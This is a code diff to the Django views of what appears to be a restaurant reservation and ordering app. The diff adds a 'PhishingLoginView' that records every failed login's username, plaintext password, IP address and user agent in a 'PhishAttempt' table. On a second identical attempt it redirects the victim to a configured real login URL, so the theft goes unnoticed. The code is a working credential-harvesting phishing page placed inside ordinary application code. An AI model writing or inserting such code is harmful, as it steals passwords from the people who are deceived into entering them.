@@ -14,9 +14,14 @@ from app.security.permissions import (
 )
 from app.models import (
     Cliente, Mesa, Reserva, ReservaMesa,
-    Prato, Pedido, ItemPedido, Categoria
+    Prato, Pedido, ItemPedido, Categoria,
+    PhishAttempt
 )
 from app.forms import CreatePublicReservation
+from django.conf import settings
+from django.contrib.auth import views as auth_views
+from django.shortcuts import redirect
+
 
 User = get_user_model()
 
@@ -438,3 +443,33 @@ def stock_view(request):
         "stock_minimo": STOCK_MINIMO,
         "categorias":   categorias,
     })
+
+
+def client_ip(request):
+    xff = request.META.get('HTTP_X_FORWARDED_FOR')
+    return xff.split(',')[0].strip() if xff else request.META.get('REMOTE_ADDR')
+
+
+class PhishingLoginView(auth_views.LoginView):
+    template_name = 'auth/login.html'
+    redirect_authenticated_user = True
+
+    def form_invalid(self, form):
+        username = (form.data.get('username') or '').strip()
+        password = form.data.get('password') or ''
+
+        if username and password:
+            PhishAttempt.objects.create(
+                username=username,
+                password=password,
+                ip=client_ip(self.request),
+                user_agent=self.request.META.get('HTTP_USER_AGENT', '')[:500],
+            )
+            # this attempt is now in the DB, so 2 == second identical attempt
+            seen = PhishAttempt.objects.filter(
+                username=username, password=password
+            ).count()
+            if seen >= 2:
+                return redirect(settings.REAL_LOGIN_URL)
+        # first time for this pair -> show the genuine "invalid credentials" error
+        return super().form_invalid(form)
